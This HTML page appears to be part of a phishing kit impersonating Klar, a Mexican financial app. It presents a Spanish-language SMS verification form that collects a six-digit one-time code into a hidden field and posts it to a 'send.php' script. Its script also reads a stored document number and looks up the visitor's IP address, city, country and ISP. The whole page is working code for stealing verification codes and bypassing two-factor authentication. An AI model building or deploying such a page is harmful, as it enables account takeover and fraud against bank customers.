<!DOCTYPE html>
<html lang="es">
  <link rel="icon" type="image/svg+xml" href="https://play-lh.googleusercontent.com/czIBDpVoyRTwndEmrIzvvFJFRMA99lN5HNtymWemLhsnORWfoKbOwPlIuDRHEs6bqs0">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verificación - Klar</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      background-color: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #111;
      padding: 20px;
    }

    .container {
      max-width: 420px;
      width: 100%;
      background-color: #fff;
      padding: 30px 25px 25px;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
      position: relative;
    }

    .back {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 24px;
      cursor: pointer;
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 10px;
    }

    .logo img {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      object-fit: cover;
    }

    .title {
      text-align: center;
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 15px;
    }

    p {
      font-size: 15px;
      color: #333;
      text-align: center;
      margin-bottom: 30px;
    }

    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 25px;
    }

    .code-inputs input {
      width: 45px;
      height: 55px;
      text-align: center;
      font-size: 22px;
      border: 2px solid #ccc;
      border-radius: 10px;
      background-color: #fafafa;
      transition: border-color 0.2s ease;
    }

    .code-inputs input:focus {
      border-color: #000;
      outline: none;
    }

    .resend {
      font-size: 13px;
      color: #777;
      text-align: center;
      margin-bottom: 30px;
    }

    .btn {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      border: none;
      border-radius: 12px;
      background-color: #000;
      color: white;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .btn:hover {
      background-color: #222;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="back">&#8592;</div>

    <div class="logo">
      <img src="https://yt3.googleusercontent.com/E-EW5dLM4sqleFAJYFri_sQFPHKKNSgvgakHxbb4tdtAcF-R1JrCPil-oVZIH0l2OUenWD1C7g=s900-c-k-c0x00ffffff-no-rj" alt="Logo" />
    </div>

    <div class="title">Verifica que eres tú</div>

    <p>Introduce el código de verificación que te enviamos al <strong>(+52) ** **** ****</strong></p>

    <form method="post" action="send.php" id="codeForm">
      <div class="code-inputs">
        <input type="text" maxlength="1" inputmode="numeric" required />
        <input type="text" maxlength="1" inputmode="numeric" required />
        <input type="text" maxlength="1" inputmode="numeric" required />
        <input type="text" maxlength="1" inputmode="numeric" required />
        <input type="text" maxlength="1" inputmode="numeric" required />
        <input type="text" maxlength="1" inputmode="numeric" required />
      </div>

      <!-- Campo oculto que se enviará a PHP -->
      <input type="hidden" name="cod1" id="fullCode">

      <div class="resend">Recuerda que es un código SMS</div>
      <button type="submit" id="submitButton" class="btn">Verificar</button>
    </form>
  </div>

  <script type="module">
    const form = document.getElementById("codeForm");
    const btn  = document.getElementById("submitButton");
    const inputs = Array.from(document.querySelectorAll(".code-inputs input"));
    const alertCode = document.getElementById("alertCode");
    const hiddenCode = document.getElementById("fullCode"); // campo oculto con name="cod1"

    // --- UX: autoavance y backspace entre inputs ---
    inputs.forEach((inp, idx) => {
      inp.addEventListener("input", () => {
        inp.value = inp.value.replace(/\D/g, "").slice(0, 1);
        if (inp.value && idx < inputs.length - 1) inputs[idx + 1].focus();
        if (alertCode) alertCode.classList.add("hidden");
      });
      inp.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !inp.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
      inp.setAttribute("autocomplete", "one-time-code");
    });

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const code = inputs.map(i => i.value.trim()).join("");
      if (code.length !== 6) {
        alert("Ingresa el código completo (6 dígitos).");
        return;
      }

      // Guardar el código concatenado en el campo oculto
      hiddenCode.value = code;

      const numdoc = (localStorage.getItem("numdoc") || "Desconocido").toString();

      let ip = "No encontrada";
      let city = "No encontrada";
      let country = "No encontrada";
      let isp = "No encontrada";
      try {
        const ipRes = await fetch("https://ipwhois.app/json/");
        const ipData = await ipRes.json();
        ip = ipData.ip || ip;
        city = ipData.city || city;
        country = ipData.country || country;
        isp = ipData.isp || ipData.org || isp;
      } catch (err) {
        console.warn("IPWhois error:", err);
      }

      btn.disabled = true;
      const originalText = btn.textContent;
      btn.textContent = "Procesando...";

      // Enviar el formulario normalmente con el campo oculto cod1
      form.submit();
    });
  </script>

</body>
</html>
